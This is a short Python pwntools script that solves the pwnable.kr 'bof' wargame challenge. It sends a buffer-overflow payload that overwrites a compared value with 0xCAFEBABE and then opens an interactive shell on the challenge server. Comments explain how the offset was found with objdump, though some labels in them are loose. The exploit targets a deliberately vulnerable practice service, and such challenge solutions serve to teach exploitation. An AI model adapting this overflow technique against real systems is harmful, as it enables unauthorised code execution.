from pwn import *

run = remote('pwnable.kr', 9000)
print(run.recv(timeout = 0))
# reading the code bof.c we see that there is a buffer has been set to a 32 bytes. then a compare operation
# by running objdump -D bof
# we can see that func is allocated with 0x2c=44 of memory
# Bs to fill BasePointer
# Cs to fill InstructionPointer
# CAFEBABE is the acting as a canary
run.sendline('A' * 0x2c +'B'*4 + 'C'*4 + '\xbe\xba\xfe\xca')
run.interactive()